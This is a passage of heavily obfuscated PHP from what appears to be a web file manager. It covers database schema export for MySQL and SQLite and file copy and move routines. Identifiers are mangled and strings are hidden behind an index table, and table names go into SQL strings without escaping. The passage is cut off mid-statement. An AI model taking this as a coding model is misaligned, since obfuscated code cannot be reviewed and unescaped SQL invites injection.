$this->sqlFromSqlite($‘í—Ûœ¥); if (!$Äİ¾ø‰á[$ĞÏ®ÏÌ¾[13]]) { continue; } fwrite($å¿øÊèí, $Äİ¾ø‰á[$ĞÏ®ÏÌ¾[13]] . PHP_EOL . PHP_EOL); if (!in_array($‘í—Ûœ¥, $« ã­)) { fwrite($äà”Ú”Ç, $Äİ¾ø‰á[$ĞÏ®ÏÌ¾[858]] . PHP_EOL . PHP_EOL); } } } else { foreach ($úóş¯¿å as $‘í—Ûœ¥) { $Äİ¾ø‰á = $this->sqlFromMysql($‘í—Ûœ¥); if (!$Äİ¾ø‰á[$ĞÏ®ÏÌ¾[858]]) { continue; } fwrite($äà”Ú”Ç, $Äİ¾ø‰á[$ĞÏ®ÏÌ¾[858]] . PHP_EOL . PHP_EOL); if (!in_array($‘í—Ûœ¥, $« ã­)) { fwrite($å¿øÊèí, $Äİ¾ø‰á[$ĞÏ®ÏÌ¾[13]] . PHP_EOL . PHP_EOL); } } } fclose($äà”Ú”Ç); fclose($å¿øÊèí); $€ÜÖÎ„— = array($ĞÏ®ÏÌ¾[858] => $›•şñ“, $ĞÏ®ÏÌ¾[13] => $Ğ¾§ÌÌÈ); return $¢°ƒ‹â ? $€ÜÖÎ„—[$¢°ƒ‹â] : $€ÜÖÎ„—; } public function dbType($‰¿Ÿçšş = false) { $Ìüˆö¨ =& $_SERVER[è¶³ÒßÑ]; $¬ó†Â›— = $‰¿Ÿçšş ? $GLOBALS[$Ìüˆö¨[6]][$Ìüˆö¨[21]] : $this->database; $¬ó†Â›— = array_change_key_case($¬ó†Â›—); $„²¹ãê = $¬ó†Â›—[$Ìüˆö¨[1020]]; if ($„²¹ãê == $Ìüˆö¨[1017]) { $íİó˜İ = explode($Ìüˆö¨[4], $¬ó†Â›—[$Ìüˆö¨[1026]]); $„²¹ãê = $íİó˜İ[0]; } $¥ùæ€Úî = array($Ìüˆö¨[1151] => $Ìüˆö¨[13], $Ìüˆö¨[965] => $Ìüˆö¨[858]); if (isset($¥ùæ€Úî[$„²¹ãê])) { $„²¹ãê = $¥ùæ€Úî[$„²¹ãê]; } return $„²¹ãê; } public function sqlFromMysql($¼ş½õ–ó, $êÀúÖ± = '') { $Ë¹Ş´¸ =& $_SERVER[è¶³ÒßÑ]; $‹³ª‘±¼ = $this->model()->db(); $ƒ¿‡Ôï = $‹³ª‘±¼->query($Ë¹Ş´¸[1152] . $¼ş½õ–ó . $Ë¹Ş´¸[454]); if (!$ƒ¿‡Ôï || !$ƒ¿‡Ôï[0]) { return !1; } $¥œôà›Î = _get($ƒ¿‡Ôï[0], $Ë¹Ş´¸[1153], $Ë¹Ş´¸[12]); if (!$¥œôà›Î) { return !1; } $ı™ˆÈª = "\104\122\x4f\120\x20\124\x41\102\x4c\105\x20\x49\106\x20\x45\130\111\123\124\x53\x20\140{$¼ş½õ–ó}\140\73" . PHP_EOL . $¥œôà›Î . $Ë¹Ş´¸[84]; if ($êÀúÖ± && $êÀúÖ± == $Ë¹Ş´¸[858]) { return $ı™ˆÈª; } $´ÆÂàâ = array_change_key_case($GLOBALS[$Ë¹Ş´¸[6]][$Ë¹Ş´¸[21]]); $éÙîÒÉ = $´ÆÂàâ[$Ë¹Ş´¸[1025]]; $¥¾û¤È = $Ë¹Ş´¸[1154] . $éÙîÒÉ . $Ë¹Ş´¸[1155] . $¼ş½õ–ó . $Ë¹Ş´¸[68]; $‚„¸Å¬Ñ = $Ë¹Ş´¸[1156] . $¼ş½õ–ó . $Ë¹Ş´¸[953]; $Ä‹ê²é§ = $‹³ª‘±¼->query($¥¾û¤È); if (empty($Ä‹ê²é§)) { $‚«ğ€×¯ = array($Ë¹Ş´¸[858] => $Ë¹Ş´¸[12], $Ë¹Ş´¸[13] => $Ë¹Ş´¸[12]); return $êÀúÖ± ? $‚«ğ€×¯[$êÀúÖ±] : $‚«ğ€×¯; } $ÇÀ›Ë™ = $‹³ª‘±¼->query($‚„¸Å¬Ñ); $êŒ´ æ† = $Ë¹Ş´¸[12]; $€ÒšÛí = array(); foreach ($ÇÀ›Ë™ as $·¾¤âñ) { if (!$êŒ´ æ† && $·¾¤âñ[$Ë¹Ş´¸[1157]] == $Ë¹Ş´¸[1158]) { $êŒ´ æ† = $·¾¤âñ[$Ë¹Ş´¸[1159]]; } if (isset($€ÒšÛí[$·¾¤âñ[$Ë¹Ş´¸[1157]]])) { $€ÒšÛí[$·¾¤âñ[$Ë¹Ş´¸[1157]]][$Ë¹Ş´¸[1160]][] = $·¾¤âñ[$Ë¹Ş´¸[1159]]; continue; } $€ÒšÛí[$·¾¤âñ[$Ë¹Ş´¸[1157]]] = array($Ë¹Ş´¸[1161] => $·¾¤âñ[$Ë¹Ş´¸[1157]], $Ë¹Ş´¸[1160] => array($·¾¤âñ[$Ë¹Ş´¸[1159]]), $Ë¹Ş´¸[1162] => $·¾¤âñ[$Ë¹Ş´¸[1163]] == $Ë¹Ş´¸[101] ? 0 : 1); } $Ş¿¸üçÏ = array(); foreach ($€ÒšÛí as $·¾¤âñ) { $şó÷Œ•ı = $·¾¤âñ[$Ë¹Ş´¸[1161]] == $Ë¹Ş´¸[1158]; $¶ËÒêè = array($Ë¹Ş´¸[1164], $·¾¤âñ[$Ë¹Ş´¸[1162]] == $Ë¹Ş´¸[101] && !$şó÷Œ•ı ? $Ë¹Ş´¸[1165] : $Ë¹Ş´¸[12], $Ë¹Ş´¸[1166], $Ë¹Ş´¸[1167] . $¼ş½õ–ó . $Ë¹Ş´¸[11] . ($şó÷Œ•ı ? $Ë¹Ş´¸[1168] : $·¾¤âñ[$Ë¹Ş´¸[1161]]) . $Ë¹Ş´¸[131], $Ë¹Ş´¸[1169], $Ë¹Ş´¸[131] . $¼ş½õ–ó . $Ë¹Ş´¸[131], $Ë¹Ş´¸[1170] . implode($Ë¹Ş´¸[1171], $·¾¤âñ[$Ë¹Ş´¸[1160]]) . $Ë¹Ş´¸[1172]); $Ş¿¸üçÏ[] = implode($Ë¹Ş´¸[53], $¶ËÒêè) . $Ë¹Ş´¸[84]; } $©çÀ³Àñ = array(); $éÌ¹Ú³å = array($Ë¹Ş´¸[1173] => $Ë¹Ş´¸[1174], $Ë¹Ş´¸[1174] => $Ë¹Ş´¸[1174], $Ë¹Ş´¸[357] => $Ë¹Ş´¸[384], $Ë¹Ş´¸[356] => $Ë¹Ş´¸[384]); foreach ($Ä‹ê²é§ as $·¾¤âñ) { $¶ËÒêè = array($Ë¹Ş´¸[131] . $·¾¤âñ[$Ë¹Ş´¸[1175]] . $Ë¹Ş´¸[131], isset($éÌ¹Ú³å[$·¾¤âñ[$Ë¹Ş´¸[1176]]]) ? $éÌ¹Ú³å[$·¾¤âñ[$Ë¹Ş´¸[1176]]] : $·¾¤âñ[$Ë¹Ş´¸[1177]], $·¾¤âñ[$Ë¹Ş´¸[1178]] == $Ë¹Ş´¸[951] ? $Ë¹Ş´¸[1179] : $Ë¹Ş´¸[1180], $·¾¤âñ[$Ë¹Ş´¸[1175]] == $êŒ´ æ† ? $Ë¹Ş´¸[1181] : $Ë¹Ş´¸[12], $·¾¤âñ[$Ë¹Ş´¸[1002]] ? strtoupper(str_replace($Ë¹Ş´¸[11], $Ë¹Ş´¸[12], $·¾¤âñ[$Ë¹Ş´¸[1002]])) : $Ë¹Ş´¸[12]); $©çÀ³Àñ[] = trim(implode($Ë¹Ş´¸[53], $¶ËÒêè)); } $§ü‘”á = array($Ë¹Ş´¸[1182] . $¼ş½õ–ó . $Ë¹Ş´¸[1183], $Ë¹Ş´¸[1184] . $¼ş½õ–ó . $Ë¹Ş´¸[1185], implode($Ë¹Ş´¸[50] . PHP_EOL, $©çÀ³Àñ), $Ë¹Ş´¸[999]); $ÑÛîÌ³ = implode(PHP_EOL, array_merge($§ü‘”á, $Ş¿¸üçÏ)); if ($êÀúÖ± && $êÀúÖ± == $Ë¹Ş´¸[13]) { return $ÑÛîÌ³; } $‚«ğ€×¯ = array($Ë¹Ş´¸[858] => $ı™ˆÈª, $Ë¹Ş´¸[13] => $ÑÛîÌ³); return $êÀúÖ± ? $‚«ğ€×¯[$êÀúÖ±] : $‚«ğ€×¯; } public function sqlFromSqlite($ò·±Ù ö, $öë—Êò = '') { $²ğØ–Œğ =& $_SERVER[è¶³ÒßÑ]; $ŸèÜ™³ = $this->model()->db(); $ÂÈÆçà¿ = "\x50\x52\x41\107\115\101\x20\124\x41\x42\114\x45\x5f\x49\x4e\106\x4f\40\50\x27{$ò·±Ù ö}\47\51"; $›˜¢©¥ = "\x53\105\x4c\x45\x43\124\40\x2a\x20\106\x52\x4f\115\40\x73\161\154\151\x74\x65\x5f\x6d\141\x73\x74\x65\162\x20\127\x48\x45\x52\105\x20\164\x62\154\137\x6e\141\155\x65\40\x3d\x20\x27{$ò·±Ù ö}\x27"; $ñóÇ·œ = $ŸèÜ™³->query($ÂÈÆçà¿); if (empty($ñóÇ·œ)) { $•êÈŸó° = array($²ğØ–Œğ[858] => $²ğØ–Œğ[12], $²ğØ–Œğ[13] => $²ğØ–Œğ[12]); return $öë—Êò ? $•êÈŸó°[$öë—Êò] : $•êÈŸó°; } $¢¡ù”Õú = $ŸèÜ™³->query($›˜¢©¥); $ÅâÑşñ = $÷ü›˜Å‡ = array(); foreach ($¢¡ù”Õú as $˜Ô²¥¶–) { if ($˜Ô²¥¶–[$²ğØ–Œğ[33]] == $²ğØ–Œğ[349]) { $ÅâÑşñ[] = $˜Ô²¥¶–[$²ğØ–Œğ[1186]]; } else { $÷ü›˜Å‡[$˜Ô²¥¶–[$²ğØ–Œğ[32]]] = $˜Ô²¥¶–[$²ğØ–Œğ[1186]]; } } $Ëô¾¿¨ı = array_merge(array($²ğØ–Œğ[1182] . $ò·±Ù ö . $²ğØ–Œğ[131]), $ÅâÑşñ, array_values($÷ü›˜Å‡)); $Ëô¾¿¨ı = implode($²ğØ–Œğ[84] . PHP_EOL, $Ëô¾¿¨ı) . $²ğØ–Œğ[84]; if ($öë—Êò && $öë—Êò == $²ğØ–Œğ[13]) { return $Ëô¾¿¨ı; } $ê²¥ü‰’ = array(); $¼çış¤í = array($²ğØ–Œğ[1174] => $²ğØ–Œğ[1187], $²ğØ–Œğ[384] => $²ğØ–Œğ[1188]); $¤é¦õñ = $²ğØ–Œğ[12]; foreach ($ñóÇ·œ as $˜Ô²¥¶–) { if ($˜Ô²¥¶–[$²ğØ–Œğ[67]] == $²ğØ–Œğ[101]) { $¤é¦õñ = $˜Ô²¥¶–[$²ğØ–Œğ[32]]; } $Ñ’Ó”Š¼ = array($²ğØ–Œğ[454] . $˜Ô²¥¶–[$²ğØ–Œğ[32]] . $²ğØ–Œğ[454], isset($¼çış¤í[$˜Ô²¥¶–[$²ğØ–Œğ[33]]]) ? $¼çış¤í[$˜Ô²¥¶–[$²ğØ–Œğ[33]]] : $˜Ô²¥¶–[$²ğØ–Œğ[33]], $˜Ô²¥¶–[$²ğØ–Œğ[35]] == $²ğØ–Œğ[101] ? $²ğØ–Œğ[1179] : $²ğØ–Œğ[1189] . $˜Ô²¥¶–[$²ğØ–Œğ[66]], $˜Ô²¥¶–[$²ğØ–Œğ[67]] == $²ğØ–Œğ[101] ? $²ğØ–Œğ[1190] : $²ğØ–Œğ[12]); $ê²¥ü‰’[] = trim(implode($²ğØ–Œğ[53], $Ñ’Ó”Š¼)); } foreach ($÷ü›˜Å‡ as $á®œŸö => $®›¶İ•) { $¾ŸÍÚØ³ = str_replace($²ğØ–Œğ[1191] . $ò·±Ù ö . $²ğØ–Œğ[11], $²ğØ–Œğ[12], $á®œŸö); $”úòï²› = str_replace(array($²ğØ–Œğ[131], $²ğØ–Œğ[1010]), $²ğØ–Œğ[454], substr($®›¶İ•, stripos($®›¶İ•, $²ğØ–Œğ[330]))); if ($¾ŸÍÚØ³ == $²ğØ–Œğ[1168]) { $¼¸¶ÍÁ² = $²ğØ–Œğ[1192] . $¤é¦õñ . $²ğØ–Œğ[1193]; } else { $¼¸¶ÍÁ² = (stripos($¾ŸÍÚØ³, $²ğØ–Œğ[11]) ? $²ğØ–Œğ[1194] : $²ğØ–Œğ[12]) . ($²ğØ–Œğ[1195] . $¾ŸÍÚØ³ . $²ğØ–Œğ[1196] . $”úòï²›); } $ê²¥ü‰’[] = $¼¸¶ÍÁ²; } $¨øæ”÷» = array($²ğØ–Œğ[1197] . $ò·±Ù ö . $²ğØ–Œğ[1198], $²ğØ–Œğ[1199] . $ò·±Ù ö . $²ğØ–Œğ[1200], implode($²ğØ–Œğ[50] . PHP_EOL, $ê²¥ü‰’), $²ğØ–Œğ[1201]); $ÖÑËöÊ» = implode(PHP_EOL, $¨øæ”÷»); if ($öë—Êò && $öë—Êò == $²ğØ–Œğ[858]) { return $ÖÑËöÊ»; } $•êÈŸó° = array($²ğØ–Œğ[858] => $ÖÑËöÊ», $²ğØ–Œğ[13] => $Ëô¾¿¨ı); return $öë—Êò ? $•êÈŸó°[$öë—Êò] : $•êÈŸó°; } } class IO extends ClassBaseCall { public static $driverCache = array(); public static $driverListSystem = array(); public static $driverListUser = array(); public static function __callStatic($ùßôÏ½¬, $¡÷®Ã–) { $ò´Å¬« =& $_SERVER[è¶³ÒßÑ]; $õ£ëòİ = $¡÷®Ã–; $GLOBALS[$ò´Å¬«[1202]] = $ò´Å¬«[1203] . $ùßôÏ½¬; Hook::trigger($ò´Å¬«[1203] . $ùßôÏ½¬ . $ò´Å¬«[1204], $õ£ëòİ); $ÓÅ–ø¯é = self::driverMake($¡÷®Ã–[0]); if (!$ÓÅ–ø¯é) { return !1; } if (method_exists($ÓÅ–ø¯é, $ùßôÏ½¬)) { $¼ÁÑ«­ = @call_user_func_array(array($ÓÅ–ø¯é, $ùßôÏ½¬), $¡÷®Ã–); } else { if (method_exists($ÓÅ–ø¯é, $ò´Å¬«[1205])) { $¼ÁÑ«­ = @call_user_func_array(array($ÓÅ–ø¯é, $ùßôÏ½¬), $¡÷®Ã–); } else { if (method_exists(self, $ùßôÏ½¬)) { $¼ÁÑ«­ = @call_user_func_array(array(self, $ùßôÏ½¬), $¡÷®Ã–); } else { $¼ÁÑ«­ = call_user_func_array(array(parent, $ùßôÏ½¬), $¡÷®Ã–); } } } Hook::trigger($ò´Å¬«[1203] . $ùßôÏ½¬ . $ò´Å¬«[1206], $õ£ëòİ, $¼ÁÑ«­); return $¼ÁÑ«­; } public static function init($Ÿµ¨Ìƒß) { return self::driverMake($Ÿµ¨Ìƒß); } public static function copy($Šç‹§Ğ¸, $—ıŒüà÷, $ûÚçÁ¯ = false, $Ù“ŞÓ§Â = false) { return self::copyMoveStart($Šç‹§Ğ¸, $—ıŒüà÷, $ûÚçÁ¯, $_SERVER[è¶³ÒßÑ][611], $Ù“ŞÓ§Â); } public static function move($‡÷ËşÉ, $·ß³â…„, $ãˆ™”ıÙ = false, $“â×Ï– = false) { return self::copyMoveStart($‡÷ËşÉ, $·ß³â…„, $ãˆ™”ıÙ, $_SERVER[è¶³ÒßÑ][613], $“â×Ï–); } private static function copyMoveStart($Ó¾œÄÛ, $ÀçôÌÅÆ, $Ü’ ÷Œà, $îïò“ŞÇ, $äşÒ£®İ) { $í†µÒƒç =& $_SERVER[è¶³ÒßÑ]; $¸‚°° = array($Ó¾œÄÛ, $ÀçôÌÅÆ, $Ü’ ÷Œà, $äşÒ£®İ); Hook::trigger($í†µÒƒç[1203] . $îïò“ŞÇ . $í†µÒƒç[1204], $¸‚°°); $÷É‹ààˆ = self::copyMove($Ó¾œÄÛ, $ÀçôÌÅÆ, $Ü’ ÷Œà, $îïò“ŞÇ, $äşÒ£®İ); Hook::trigger($í†µÒƒç[1203] . $îïò“ŞÇ . $í†µÒƒç[1206], $¸‚°°, $÷É‹ààˆ); return $÷É‹ààˆ; } public static function saveFile($ËßñÒù, $æĞ‹ì×—, $¸¹Ü¦é = true) { $¯¦¸â =& $_SERVER[è¶³ÒßÑ]; $¥êäÆ„‹ = self::info($æĞ‹ì×—); $ÍÌı‘ó„ = self::driverMake($ËßñÒù); $—İï—½À = self::driverMake($æĞ‹ì×—); $‚Ö¸¡¨ = !1; if ($—İï—½À->pathParse[$¯¦¸â[1207]]) { $‚Ö¸¡¨ = $—İï—½À; $¼ÚšÌ¿… = $—İï—½À->pathParse[$¯¦¸â[1207]]; $—İï—½À = self::driverMake($¼ÚšÌ¿…); } if ($ÍÌı‘ó„->pathParse[$¯¦¸â[1207]]) { $¾ü¬íã» = $ÍÌı‘ó„->pathParse[$¯¦¸â[1207]]; $ÍÌı‘ó„ = self::driverMake($¾ü¬íã»); } $ª„û¹é = $—İï—½À->pathFather($æĞ‹ì×—); $Éª…ü¥ = !0; if (!$¸¹Ü¦é && self::driverIsSame($ÍÌı‘ó„, $—İï—½À)) { $Éª…ü¥ = !1; } $¼ø´¤şŠ = self::copyFile($ÍÌı‘ó„, $ËßñÒù, $—İï—½À, $ª„û¹é, $¥êäÆ„‹[$¯¦¸â[32]], $Éª…ü¥); if ($‚Ö¸¡¨) { $¼ø´¤şŠ = $‚Ö¸¡¨->getPathOuter($¼ø´¤şŠ); } return $¼ø´¤şŠ; } private static function copyMove($÷ñçÑûÉ, $¡ğ“’æ, $¢Á’ˆ, $—Ì³ŒÊ„, $Œ‰åëŠÎ = false) { $ü›×®× =& $_SERVER[è¶³ÒßÑ]; if (!$÷ñçÑûÉ || $÷ñçÑûÉ == $ü›×®×[8] || !$¡ğ“’æ) { return !1; } ignore_timeout(); $œä«Ï›Ï = self::driverMake($÷ñçÑûÉ); $üœ‚´ = self::driverMake($¡ğ“’æ); $Ÿ¯óôØ = $—Ì³ŒÊ„ == $ü›×®×[613]; $ÂœË†ãÉ = !1; if ($üœ‚´->pathParse[$ü›×®×[1207]]) { $ÂœË†ãÉ = $üœ‚´; $¡ğ“’æ = $üœ‚´->pathParse[$ü›×®×[1207]]; $üœ‚´ = self::driverMake($¡ğ“’æ); } if ($œä«Ï›Ï->pathParse[$ü›×®×[1207]]) { $÷ñçÑûÉ = $œä«Ï›Ï->pathParse[$ü›×®×[1207]]; $œä«Ï›Ï = self::driverMake($÷ñçÑûÉ); } self::check($œä«Ï›Ï, $÷ñçÑûÉ, $üœ‚´, $¡ğ“’æ); Hook::trigger($ü›×®×[1208], $œä«Ï›Ï, $÷ñçÑûÉ, $üœ‚´, $¡ğ“’æ); $‹œî™Ì¿ = self::driverIsSame($œä«Ï›Ï, $üœ‚´); if ($‹œî™Ì¿) { if ($—Ì³ŒÊ„ == $ü›×®×[613] && !method_exists($üœ‚´, $ü›×®×[1209]) && trim($¡ğ“’æ, $ü›×®×[8]) == trim($üœ‚´->pathFather($÷ñçÑûÉ), $ü›×®×[8])) { if ($œä«Ï›Ï->pathThis($÷ñçÑûÉ) != $Œ‰åëŠÎ && !$œä«Ï›Ï->isOsDriver()) { return $œä«Ï›Ï->rename($÷ñçÑûÉ, $Œ‰åëŠÎ); } return $üœ‚´->getPathOuter($÷ñçÑûÉ); } if (method_exists($üœ‚´, $—Ì³ŒÊ„)) { return $üœ‚´->{$—Ì³ŒÊ„}($÷ñçÑûÉ, $¡ğ“’æ, $¢Á’ˆ, $Œ‰åëŠÎ); } } if ($‹œî™Ì¿ && $—Ì³ŒÊ„ == $ü›×®×[613] && $üœ‚´->getType() == $ü›×®×[119]) { $ğåÙ”èÅ = $üœ‚´->movePath($÷ñçÑûÉ, $¡ğ“’æ, $Œ‰åëŠÎ); if ($ğåÙ”èÅ) { return $ğåÙ”èÅ; } } $Ê˜‰¬¡ = $œä«Ï›Ï->isFile($÷ñçÑûÉ); if (!$Ê˜‰¬¡ && $üœ‚´->getType() == $ü›×®×[811] && $œä«Ï›Ï->getType() == $ü›×®×[119]) { $ğåÙ”èÅ = $üœ‚´->copyFolderFromIO($œä«Ï›Ï, $÷ñçÑûÉ, $¡ğ“’æ, $¢Á’ˆ, $Ÿ¯óôØ, $Œ‰åëŠÎ); } else { $ğåÙ”èÅ = self::copyPath($œä«Ï›Ï, $÷ñçÑûÉ, $üœ‚´, $¡ğ“’æ, $¢Á’ˆ, $Ÿ¯óôØ, $Ê˜‰¬¡, $Œ‰åëŠÎ); } if ($ğåÙ”èÅ && $Ÿ¯óôØ) { $œä«Ï›Ï->remove($÷ñçÑûÉ); } if ($ÂœË†ãÉ) { $ğåÙ”èÅ = $ÂœË†ãÉ->getPathOuter($ğåÙ”èÅ); } return $ğåÙ”èÅ; } private static function check($›œ‚–ÓÓ, $Íî½‚ô, $•¼¦Ÿ³, &$ÍÚçóüú) { $¹…ŠÀ¼ê =& $_SERVER[è¶³ÒßÑ]; if (self::driverIsSame($›œ‚–ÓÓ, $•¼¦Ÿ³) && $›œ‚–ÓÓ->isFolder($Íî½‚ô) && $›œ‚–ÓÓ->isParentOf($Íî½‚ô, $ÍÚçóüú)) { show_json(LNG($¹…ŠÀ¼ê[1210]), !1); } if (!$›œ‚–ÓÓ->exist($Íî½‚ô)) { show_json(LNG($¹…ŠÀ¼ê[118]), !1); } } private static function copyPath($›¥µßûŞ, $ÌÇ“ÛÆó, $ô«»ù•ò, $Á÷Ó¦ñ, $²¿±ù“, $±„ƒøœ¹, $µ—£”ìù, $ÚÂĞÁ¶Ò = false, $ÎÅÂÅ»ó = true) { $â´•ˆÉø =& $_SERVER[è¶³ÒßÑ]; $şÛïÏŠŸ = empty($ÚÂĞÁ¶Ò) && $ÚÂĞÁ¶Ò !== $â´•ˆÉø[238] ? $›¥µßûŞ->pathThis($ÌÇ“ÛÆó) : $ÚÂĞÁ¶Ò; if ($²¿±ù“) { $¡Ôñ Å = $ô«»ù•ò->fileNameExist($Á÷Ó¦ñ, $şÛïÏŠŸ); $ŞğÎš´¸ = $şÛïÏŠŸ; $şÛïÏŠŸ = $ô«»ù•ò->fileNameAuto($Á÷Ó¦ñ, $şÛïÏŠŸ, $²¿±ù“, !$µ—£”ìù); if (!$¡Ôñ Å || $ŞğÎš´¸ != $şÛïÏŠŸ) { $²¿±ù“ = !1; } if ($ÎÅÂÅ»ó && !$²¿±ù“) { $ô«»ù•ò->_data[$â´•ˆÉø[1211]] = !0; } } if ($µ—£”ìù) { return self::copyFile($›¥µßûŞ, $ÌÇ“ÛÆó, $ô«»ù•ò, $Á÷Ó¦ñ, $şÛïÏŠŸ, $±„ƒøœ¹); } if ($²¿±ù“ == REPEAT_RENAME_FOLDER) { $²¿±ù“ = !1; } $ÜÈçŠ¤š = rtrim($Á÷Ó¦ñ, $â´•ˆÉø[8]) . $â´•ˆÉø[8] . $şÛïÏŠŸ; $ÉÊŠŸá¢ = $ô«»ù•ò->mkdir($ô«»ù•ò->getPath($ÜÈçŠ¤š), $²¿±ù“); $Á÷Ó¦ñ = $ô«»ù•ò->getPathInner($ÉÊŠŸá¢); $¹ßñßÍœ = $›¥µßûŞ->listPath($ÌÇ“ÛÆó, !0); $¹ßñßÍœ = is_array($¹ßñßÍœ) ? $¹ßñßÍœ : array($â´•ˆÉø[96] => array(), $â´•ˆÉø[95] => array()); $á‰­°Î¥ = array_merge($¹ßñßÍœ[$â´•ˆÉø[96]], $¹ßñßÍœ[$â´•ˆÉø[95]]); foreach ($á‰­°Î¥ as $áôê¸°) { $©Å¥¯æä = $áôê¸°[$â´•ˆÉø[33]] == $â´•ˆÉø[240]; $ÌÇ“ÛÆó = $›¥µßûŞ->getPathInner($áôê¸°[$â´•ˆÉø[97]]); $¬ £óáî = self::copyPath($›¥µßûŞ, $ÌÇ“ÛÆó, $ô«»ù•ò, $Á÷Ó¦ñ, $²¿±ù“, $±„ƒøœ¹, $©Å¥¯æä, !1, !1); if (!$¬ £óáî) { IO::errorTips($â´•ˆÉø[1212] . $ÌÇ“ÛÆó . $â´•ˆÉø[83] . $Á÷Ó¦ñ); } } self::copyMoveKeepInfo($›¥µßûŞ, $ÌÇ“ÛÆó, $ÉÊŠŸá¢); return $ÉÊŠŸá¢; } private static function copyFile($ÛÖôŸ‘ƒ, $ŒÕÍ¨œı, $ÚÔƒ¶±§, $å‚û¼À, $ê½Õá», $ÂãÑæĞ‘) { $Ùˆ­şê =& $_SERVER[è¶³ÒßÑ]; $å‚û¼À = $ÚÔƒ¶±§->getPath(rtrim($å‚û¼À, $Ùˆ­şê[8]) . $Ùˆ­şê[8] . $ê½Õá»); $ŞÓ·„ŸÔ = $Ùˆ­şê[1213] . time() . rand_string(5); Hook::trigger($Ùˆ­şê[1214], $ÛÖôŸ‘ƒ, $ŒÕÍ¨œı, $ÚÔƒ¶±§, $å‚û¼À, $ê½Õá», $ŞÓ·„ŸÔ); if (self::driverIsSame($ÛÖôŸ‘ƒ, $ÚÔƒ¶±§)) { if ($ÂãÑæĞ‘) { $Òö…Å½² = $ÚÔƒ¶±§->moveFile($ŒÕÍ¨œı, $å‚û¼À); } else { $Òö…Å½² = $ÚÔƒ¶±§->copyFile($ŒÕÍ¨œı, $å‚û¼À); } Hook::trigger($Ùˆ­şê[1215], $ÛÖôŸ‘ƒ, $ŒÕÍ¨œı, $ÚÔƒ¶±§, $å‚û¼À, $ê½Õá», $Òö…Å½²); self::copyMoveKeepInfo($ÛÖôŸ‘ƒ, $ŒÕÍ¨œı, $Òö…Å½²); return $Òö…Å½²; } $ÑÉâ˜ = TEMP_FILES; if ($GLOBALS[$Ùˆ­şê[6]][$Ùˆ­şê[102]][$Ùˆ­şê[850]]) { $ÑÉâ˜ = $GLOBALS[$Ùˆ­şê[6]][$Ùˆ­şê[102]][$Ùˆ­şê[850]]; } $ùİ©Ç† = $ÑÉâ˜; mk_dir($ùİ©Ç†); $ô…é½ = $ùİ©Ç† . $ŞÓ·„ŸÔ; $¶„Á¢œÅ = $ô…é½; $ô…é½ = $ÛÖôŸ‘ƒ->download($ŒÕÍ¨œı, $ô…é½); $ô…é½ = $ÛÖôŸ‘ƒ->iconvApp($ô…é½); if (substr($ô…é½, strlen($ÑÉâ˜)) == $ÑÉâ˜) { $ÂãÑæĞ‘ = !0; } $Òö…Å½² = $ÚÔƒ¶±§->upload($å‚û¼À, $ô…é½, $ÂãÑæĞ‘); self::remove($¶„Á¢œÅ); Hook::trigger($Ùˆ­şê[1215], $ÛÖôŸ‘ƒ, $ŒÕÍ¨œı, $ÚÔƒ¶±§, $å‚û¼À, $ê½Õá», $Òö…Å½²); self::copyMoveKeepInfo($ÛÖôŸ‘ƒ, $ŒÕÍ¨œı, $Òö…Å½²); return $Òö…Å½²; } private static function copyMoveKeepInfo($¾ÜƒŠ‡Œ, $¶ßòğ¨÷, $ùÏçï‹) { if (!$ùÏçï‹) { return; } $™×Á²¡¥ = $¾ÜƒŠ‡Œ->info($¶ßòğ¨÷); if (!is_array($™×Á²¡¥)) { return; } IO::setModifyTime($ùÏçï‹, $™×Á²¡¥[$_SERVER[è¶³ÒßÑ][98]]); } public static function pathFather($ŠÂğò¤ç) { $Ù­šú¨• = IO::init($ŠÂğò¤ç); $ßĞ³æ˜ï = $Ù­šú¨•->pathFather($Ù­šú¨•->path); return $Ù­šú¨•->getPathOuter($ßĞ³æ˜ï); } public static function fileOut($ş·Îß€¼, $ö³õğ½ç = false, $½à°Ö¾ = false, $ı—öì¬Ç = '') { $¼¤µ¢¥Ì = self::driverMake($ş·Îß€¼); if ($¼¤µ¢¥Ì->isFileOutServer()) { return $¼¤µ¢¥Ì->fileOutServer($ş·Îß€¼, $ö³õğ½ç, $½à°Ö¾, $ı—öì¬Ç); } return $¼¤µ¢¥Ì->fileOut($ş·Îß€¼, $ö³õğ½ç, $½à°Ö¾, $ı—öì¬Ç); } public static function fileOutImage($Öğ£ŞëÊ, $Ş°½¡ø¨ = 250) { $œÏ®Ä—› = array(250, 600, 1200, 2000, 3000, 5000); for ($Õ¬à…´Ö = 0; $Õ¬à…´Ö < count($œÏ®Ä—›); $Õ¬à…´Ö++) { if ($Õ¬à…´Ö == 0 && $Ş°½¡ø¨ <= $œÏ®Ä—›[$Õ¬à…´Ö]) { $Ş°½¡ø¨ = $œÏ®Ä—›[$Õ¬à…´Ö]; break; } else { if ($Ş°½¡ø¨ > $œÏ®Ä—›[$Õ¬à…´Ö - 1] && $Ş°½¡ø¨ <= $œÏ®Ä—›[$Õ¬à…´Ö]) { $Ş°½¡ø¨ = $œÏ®Ä—›[$Õ¬à…´Ö]; break; } else { if ($Õ¬à…´Ö == count($œÏ®Ä—›) - 1 && $Ş°½¡ø¨ > $œÏ®Ä—›[$Õ¬à…´Ö]) { $Ş°½¡ø¨ = $œÏ®Ä—›[$Õ¬à…´Ö]; break; } } } } $…Â­µ‘Ä = self::driverMake($Öğ£ŞëÊ); if ($…Â­µ‘Ä->isFileOutServer()) { return $…Â­µ‘Ä->fileOutImageServer($Öğ£ŞëÊ, $Ş°½¡ø¨); } return $…Â­µ‘Ä->fileOutImage($Öğ£ŞëÊ, $Ş°½¡ø¨); } private static function driverIsSame($˜µ¶†Ÿ›, $Ù…éÓÁ) { $×´Ğªèº =& $_SERVER[è¶³ÒßÑ]; $ÕÎÊ‘¯ = $˜µ¶†Ÿ›->getType(); $€âº‡Ë = $Ù…éÓÁ->getType(); if ($ÕÎÊ‘¯ != $€âº‡Ë) { return !1; } if ($ÕÎÊ‘¯ == $×´Ğªèº[811]) { return !0; } if ($ÕÎÊ‘¯ == $×´Ğªèº[119]) { return !0; } if ($˜µ¶†Ÿ›->pathDriver == $Ù…éÓÁ->pathDriver) { return !0; } return !1; } public static function copyUpdate($üÛèºŞÕ, $³šÖçÙ») { $ÁÖ·ê«Ö =& $_SERVER[è¶³ÒßÑ]; if (!IO::exist($üÛèºŞÕ)) { return !1; } if (!IO::exist($³šÖçÙ»)) { IO::mkdir($³šÖçÙ»); } $ËŠü±ÓĞ = array_to_keyvalue(self::listAllSimple($üÛèºŞÕ), $ÁÖ·ê«Ö[97]); $Ö‡°äî = 